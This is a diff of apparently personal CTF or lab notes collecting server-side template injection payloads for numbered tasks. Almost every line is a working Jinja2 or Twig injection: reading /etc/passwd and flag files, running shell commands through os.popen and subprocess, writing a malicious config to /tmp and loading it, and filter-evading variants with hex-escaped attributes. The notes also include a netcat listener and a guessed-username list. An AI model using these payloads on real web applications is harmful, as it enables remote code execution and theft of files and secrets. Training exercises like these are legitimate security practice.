@@ -5,9 +5,14 @@ task 26
 #''.__class__.__mro__[2].__subclasses__()[40] = File class
 {{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
 
+
+%20joiner.__init__.__globals__.os.popen%EF%BC%88'dir%20-a'%EF%BC%89.read%EF%BC%88%EF%BC%89%20
+
 {{ joiner.__init__.__globals__.os.popen('dir -a').read() }}
 {{ joiner.__init__.__globals__.os.popen('find / | grep flag').read() }}
 {{''.__class__.__mro__[2].__subclasses__()[40]('/root/flag').read() }}
+
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 
 request["__class__"]
 
@@ -18,6 +23,14 @@ nc -lvnp 9001
 
 task 27
 
+
+
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg','w').write('from subprocess import check_output')}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg','a').write('\nRUNCMD=check_output')}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg').read() }}
+{{config.from_pyfile('/tmp/evilconfig.cfg')}}
+
+
 {{''.__class__.__mro__[1].__subclasses__()[280]('find / | grep flag', shell=True, stdout=-1).communicate()}}
 {{''.__class__.__mro__[1].__subclasses__()[280]('cat /root/flag', shell=True, stdout=-1).communicate()}}
 
@@ -26,27 +39,17 @@ hint: Delete style in head (it hides secret input)
 and then use dir -a
 {{self}}
 {{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("find / | grep flag")}} 
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("cat ._flag")}} 
 
 task 29
 
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')("grep -rnF '/root' -e 'ssti' -i | grep -v 'binary file' -i ")|attr('read')()}}
-
-Codeby
-Support
-CodebySupport
-codeby
-support
-codebysupport
-Codeby Support
-Codeby%20Support
-CodebySupport-Login
-Codeby_Support
-Codeby-Support
-codeby_support
-codeby-support
-admin
 
 user password
+
+name=test&desc={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')("grep -rnF '/root' -e 'cdb' -i ")|attr('read')()}}
+
+name=test_ticket&desc={{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')("cat /root/ticketer/.secret_flag")|attr('read')()}}
 
 {{7*'7'}}
 <%=7*7%>
@@ -73,6 +76,10 @@ Java
 
 30
 
+http://10.8.32.1:42795/new/
+
+GET /new/{{7*7}} HTTP/1.1
+
 https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad3f
 
 
@@ -84,7 +91,7 @@ https://infosecwriteups.com/tokyowesterns-ctf-4th-2018-writeup-part-3-1c8510dfad
 
 {{url_for.__globals__.current_app.config}}
 
-
+here in this config file is the flag
 
 
 
@@ -99,8 +106,8 @@ traSH:
 10.8.32.1:42792/new/{{ "foo".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['open'](%27id%27).read()}}
 
 
-
-http://10.8.32.1:42793/new/%7B%7B%20''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__.__builtins__.open().read()}}
+{{ ''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__.__builtins__.open().read()}}
+http://10.8.32.1:42793/new/{{''['__class__']['__base__']['__subclasses__'][127].__init__.__globals__.__builtins__.open().read()}}
 
 
 {{%27%27[%27__class__%27].__mro__[2].__subclasses__()[40](%27/etc/passwd%27).read() }}
